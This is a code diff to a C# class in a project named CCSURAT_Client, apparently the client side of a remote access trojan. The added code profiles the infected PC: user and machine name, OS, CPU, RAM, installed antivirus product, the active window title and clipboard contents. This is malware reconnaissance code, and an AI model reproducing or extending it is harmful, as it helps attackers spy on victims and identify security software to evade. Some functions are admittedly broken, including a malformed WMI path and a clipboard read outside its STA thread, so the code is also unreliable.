@@ -1,17 +1,15 @@
 ﻿using System;
 using Microsoft.Win32;
 using System.Management;
-using System.Collections.Generic;
-using System.Linq;
-using System.Net;
-using System.Text;
-using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
 
 namespace CCSURAT_Client
 {
     // this class is used to retrieve/store information on the client PC
-    // this will also be where command functions are written.
+    // this will also be where info/basic command functions are written.
     static class SystemUtils
     {
         public static string SystemInfo()
@@ -21,7 +19,10 @@ namespace CCSURAT_Client
             info += Environment.MachineName + "|*|";
             info += Environment.UserName + "|*|";
             info += GetOS() + "|*|";
-            info += GetCPU();
+            info += GetCPU() + "|*|";
+            info += GetRAM() + "|*|";
+            info += GetAV() + "|*|";
+            info += GetActiveWindow();
             return info;
         }
 
@@ -29,19 +30,93 @@ namespace CCSURAT_Client
         public static string GetOS()
         {
             RegistryKey reg = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
-            string OS = (string)reg.GetValue("ProductName");
-            return OS;
+            return (string)reg.GetValue("ProductName");
         }
 
         public static string GetCPU()
         {
-            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Name FROM Win32_Processor");
-            string CPU = "";
-            foreach (ManagementObject m in searcher.Get())
-            {
+            // Can count subkeys to get # of cores.
+            RegistryKey reg = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0");
+            return (string)reg.GetValue("ProcessorNameString");
+        }
 
+        public static string GetRAM()
+        {
+            long total = 0;
+            // Query WMI
+            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Capacity FROM Win32_PhysicalMemory");
+            // Get each stick of installed memory
+            foreach (ManagementObject mObj in searcher.Get())
+            {
+                // Convert to GB from Bytes and add to total
+                 total += Convert.ToInt64(mObj["Capacity"]) / 1024 / 1024 / 1024;
             }
-            return CPU;
+            return total.ToString() + " GB";
+        }
+
+        // Attempts to grab AV from WMI, test have shown that this may not work properly. Rework.
+        public static string GetAV()
+        {
+            try
+            {
+                ManagementObjectSearcher searcher = null;
+                searcher = new ManagementObjectSearcher(@"\" + Environment.MachineName + @"rootSecurityCenter2","SELECT * FROM AntivirusProduct");
+                foreach (ManagementObject mObj in searcher.Get())
+                    return mObj["displayName"].ToString();
+            }
+            catch(Exception ex)
+            {
+                return "Not Found";
+            }
+            return "Not Found";
+        }
+
+        // Get current active (window in foreground window
+        [DllImport("user32.dll")]
+        static extern IntPtr GetForegroundWindow();
+        [DllImport("user32.dll")]
+        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+        public static string GetActiveWindow()
+        {
+            const int nChars = 256;
+            StringBuilder Buff = new StringBuilder(nChars);
+            IntPtr handle = GetForegroundWindow();
+
+            if (GetWindowText(handle, Buff, nChars) > 0)
+            {
+                return Buff.ToString();
+            }
+            return null;
+        }
+
+        // ########## Desperate attempt to get clipboard, DOES NOT WORK, need to figure out why.
+        // #####################################################################################
+        public static string GetClipboard()
+        {
+            IDataObject idat = null;
+            Exception threadEx = null;
+            Thread staThread = new Thread(
+                delegate ()
+                {
+                    try
+                    {
+                        idat = Clipboard.GetDataObject();
+                    }
+
+                    catch (Exception ex)
+                    {
+                        threadEx = ex;
+                    }
+                });
+            staThread.SetApartmentState(ApartmentState.STA);
+            staThread.Start();
+            staThread.Join();
+            string clipboard = Clipboard.GetData("").ToString();
+            if (clipboard == string.Empty)
+            {
+                return "[[EMPTY]]";
+            }
+            return clipboard;
         }
     }
 }
